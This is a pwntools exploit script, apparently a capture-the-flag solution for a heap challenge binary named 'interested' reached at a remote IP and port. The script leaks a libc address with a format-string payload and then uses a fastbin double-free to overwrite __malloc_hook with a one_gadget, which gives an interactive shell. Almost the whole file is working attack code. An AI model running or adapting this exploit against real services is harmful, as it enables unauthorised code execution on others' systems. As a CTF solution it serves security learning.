#! /usr/bin/python

from pwn import *
from LibcSearcher import *

#p = process('./interested')
p = remote('123.56.85.29',3041)
elf = ELF('./interested')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level = 'debug'

def menu(choice):
	p.recvuntil('Now please tell me what you want to do :')
	p.sendline(str(choice))

def check_code():
	menu(0)

def add(o_size,o_content,re_size,re_content):
	menu(1)
	p.recvuntil("length : ")
	p.sendline(str(o_size))
	p.recvuntil("O :")
	p.sendline(o_content)
	p.recvuntil("> RE's length : ")
	p.sendline(str(re_size))
	p.recvuntil("> RE :")
	p.sendline(re_content)

def edit(idx,o_content,re_content):
	menu(2)
	p.recvuntil('> Oreo ID : ')
	p.sendline(str(idx))
	p.recvuntil('> O : ')
	p.sendline(o_content)
	p.recvuntil('> RE : ')
	p.sendline(re_content)

def delete(idx):
	menu(3)
	p.recvuntil('> Oreo ID : ')
	p.sendline(str(idx))

def view(idx):
	menu(4)
	p.recvuntil('> Oreo ID : ')
	p.sendline(str(idx))

def getshell(o_size):
	menu(1)
	p.recvuntil("length : ")
	p.sendline(str(o_size))
###leak libc###
p.recvuntil('> Input your code please:')
payload = 'OreOOrereOOreO' + '%17$p'
p.sendline(payload)

check_code()
p.recvuntil('# Your Code is OreOOrereOOreO')
libc_start_main = int(p.recv(14),16) - 240

libc = LibcSearcher('__libc_start_main',libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')
success('libc base:'+hex(libc_base))
pause()
###fastbin attack###
malloc_hook = libc_base + libc.dump('__malloc_hook')
fake_chunk = malloc_hook - 0x23
libc_one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + libc_one_gadget[1]
realloc = libc_base + libc.dump('__libc_realloc')

add(0x60,'aaaa',0x60,'bbbb')#1
add(0x60,'aaaa',0x60,'bbbb')#2
add(0x60,'aaaa',0x60,'bbbb')#3
add(0x20,'aaaa',0x20,'bbbb')

delete(4)
delete(2)
delete(3)
delete(2)

add(0x60,p64(fake_chunk),0x60,p64(fake_chunk))#4
add(0x60,'cccc',0x60,'dddd')#5

payload = 'A' * (0x13-0x8) + p64(one_gadget) + p64(realloc+13)
#payload = 'A' * 0x13 + p64(one_gadget)
add(0x60,payload,0x60,payload)#6

#gdb.attach(p)
#pause()

###get shell###
#getshell(10)
p.interactive()